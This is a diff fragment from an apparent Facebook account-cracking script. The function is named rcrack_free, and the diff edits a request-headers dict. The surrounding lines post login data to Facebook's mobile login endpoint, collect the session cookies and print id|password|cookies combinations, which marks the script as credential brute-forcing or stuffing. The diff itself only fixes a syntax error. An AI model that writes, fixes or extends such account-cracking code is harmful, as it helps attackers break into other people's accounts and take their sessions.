@@ -570,8 +570,7 @@ def rcrack_free(idf,pwv):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    user-agent }
+    'upgrade-insecure-requests': '1'}
 			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
